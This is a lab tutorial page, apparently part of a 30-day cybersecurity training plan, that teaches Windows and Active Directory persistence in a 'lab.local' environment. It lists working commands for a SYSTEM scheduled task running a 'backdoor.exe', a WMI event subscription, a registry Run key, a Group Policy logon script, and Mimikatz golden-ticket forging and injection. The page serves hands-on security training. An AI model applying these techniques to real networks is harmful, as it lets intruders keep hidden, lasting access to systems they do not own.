@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Day 7 - Domain Persistence Techniques | 30-Day Hybrid Cybersecurity Lab Plan</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+            color: #374151;
+        }
+        .container {
+            max-width: 900px;
+        }
+        .day-card {
+            background-color: #ffffff;
+            border-radius: 0.75rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .day-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #1f2937;
+            margin-bottom: 0.75rem;
+        }
+        .goal-text {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: #4b5563;
+            margin-bottom: 1rem;
+        }
+        .step-heading {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: #1f2937;
+            margin-top: 1rem;
+            margin-bottom: 0.5rem;
+        }
+        .checklist-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.5rem;
+        }
+        .checklist-icon {
+            color: #10b981;
+            margin-right: 0.5rem;
+            font-size: 1.25rem;
+        }
+        a {
+            color: #2563eb;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin: 2rem 0;
+        }
+        .nav-button {
+            padding: 0.75rem 1.5rem;
+            background-color: #2563eb;
+            color: white;
+            border-radius: 0.5rem;
+            font-weight: 600;
+            transition: background-color 0.2s;
+        }
+        .nav-button:hover {
+            background-color: #1d4ed8;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body class="p-4 sm:p-8">
+    <div class="container mx-auto">
+        <header class="text-center mb-10">
+            <h1 class="text-4xl sm:text-5xl font-extrabold text-gray-900 mb-4 rounded-xl p-4 bg-white shadow-lg">
+                Day 7: Domain Persistence Techniques
+            </h1>
+            <p class="text-xl text-gray-700 leading-relaxed">
+                Week 1 - Foundation & Setup
+            </p>
+        </header>
+
+        <div class="nav-buttons">
+            <a href="cyber-week1-day6.html" class="nav-button">← Day 6</a>
+            <a href="cyber-week1.html" class="nav-button">Back to Week 1</a>
+        </div>
+
+        <div class="day-card">
+            <h2 class="day-title">Day 7 — Domain Persistence Techniques</h2>
+            <p class="goal-text">
+                Goal: Implement persistence mechanisms in the lab.local environment to maintain access after credential changes or reboots, covering both local and domain-level techniques.
+            </p>
+            <h3 class="step-heading">Step 1 — Scheduled Tasks for Persistence</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>On a compromised machine, create a scheduled task to run your payload:<br><code class="bg-gray-100 p-1 rounded">schtasks /create /sc onlogon /tn "Updater" /tr "C:\\Windows\\System32\\backdoor.exe" /ru SYSTEM</code></li>
+                <li>Verify with:<br><code class="bg-gray-100 p-1 rounded">schtasks /query /tn "Updater"</code></li>
+            </ul>
+            <h3 class="step-heading">Step 2 — WMI Event Subscription</h3>
+            <pre class="bg-gray-100 p-2 rounded-md overflow-x-auto text-sm ml-4">
+<code class="text-gray-800">$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name='LogonTrigger';EventNamespace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"}
+$Consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name='PayloadConsumer';CommandLineTemplate='C:\\Windows\\System32\\backdoor.exe'}
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$Filter;Consumer=$Consumer}</code>
+            </pre>
+            <p class="ml-4">This survives reboots and runs as SYSTEM.</p>
+            <h3 class="step-heading">Step 3 — Registry Run Keys</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Add a persistence entry to run on logon:<br><code class="bg-gray-100 p-1 rounded">reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\\Windows\\System32\\backdoor.exe"</code></li>
+            </ul>
+            <h3 class="step-heading">Step 4 — Domain Group Policy Logon Script</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>On the Domain Controller: Open <code class="bg-gray-100 p-1 rounded">Group Policy Management</code></li>
+                <li>Edit the Default Domain Policy</li>
+                <li>Navigate to <code class="bg-gray-100 p-1 rounded">User Configuration → Windows Settings → Scripts (Logon/Logoff)</code></li>
+                <li>Add your script to execute at user logon across the domain</li>
+            </ul>
+            <h3 class="step-heading">Step 5 — Golden Ticket Persistence (Advanced)</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>If you have KRBTGT hash from DC, create a Golden Ticket with Mimikatz:<br><code class="bg-gray-100 p-1 rounded">mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:&lt;Domain_SID&gt; /krbtgt:&lt;KRBTGT_hash&gt; /id:500</code></li>
+                <li>Inject the ticket into your session:<br><code class="bg-gray-100 p-1 rounded">mimikatz # kerberos::ptt &lt;ticket.kirbi&gt;</code></li>
+            </ul>
+            <p class="ml-4">Grants indefinite domain access until KRBTGT password is reset twice.</p>
+            <h3 class="step-heading">End of Day 7 Success Criteria:</h3>
+            <div class="ml-4">
+                <div class="checklist-item"><span class="checklist-icon">✅</span>At least two persistence mechanisms implemented and tested</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>One domain-level persistence method working across multiple hosts</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>All methods documented with steps for both deployment and removal</div>
+            </div>
+        </div>
+
+        <div class="nav-buttons">
+            <a href="cyber-week1-day6.html" class="nav-button">← Day 6</a>
+            <a href="cyber-week2.html" class="nav-button">Week 2 →</a>
+        </div>
+
+        <footer class="mt-12 text-center text-gray-600">
+            <p>&copy; 2024 Hybrid Cybersecurity Lab Plan. All rights reserved.</p>
+        </footer>
+    </div>
+</body>
+</html>
